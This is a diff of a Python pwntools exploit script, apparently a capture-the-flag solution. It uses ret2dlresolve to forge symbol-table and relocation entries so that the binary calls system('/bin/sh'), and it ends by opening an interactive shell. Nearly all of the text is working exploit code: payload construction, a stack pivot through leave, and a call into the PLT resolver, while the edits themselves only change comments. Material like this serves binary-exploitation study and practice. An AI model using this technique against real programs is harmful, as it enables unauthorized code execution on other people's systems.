@@ -67,8 +67,8 @@ check = (fake_rel  - JMPREL) / 0x18
 print(check)
 reloc_arg = int( check  )
 info(f'reloc arg: {hex(reloc_arg)}')
-# Fake .symtab
 
+# Fake .symtab
 fake_symtab = buf+0x48-0x18
 pad2 = align(fake_symtab - SYMTAB)
 info(f'pad symtab: {pad2}')
@@ -85,7 +85,6 @@ st_name = fake_symstr - STRTAB # offset between fake str and str_tab
 
 info(f'sh: {hex(sh)}')
 info(f'fake str: {hex(fake_symstr)}')
-# info(f'')
 
 # on stack
 load = flat(
@@ -97,7 +96,7 @@ load = flat(
 
 sl(load)
 
-# write string
+# write system string
 load = flat(
     # pop_rsi,
     b'system\0\0',
@@ -110,8 +109,7 @@ load += flat(
 )
 sl(load)
 
-# change rsp
-
+# Write /bin/sh
 load = flat(
     b'/bin/sh\0',
     b'A'*0x58,
@@ -134,7 +132,6 @@ load += p64(default_plt)
 load += p64(reloc_arg) # reloc_arg
 
 # .rel
-# load += p64(0)*1
 load += p64(exe.got.read)
 load += p64(r_info)
 
@@ -153,7 +150,6 @@ load += flat(
     leave,
 )
 
-# 0x404d40
 sl(load)
 
 p.interactive()
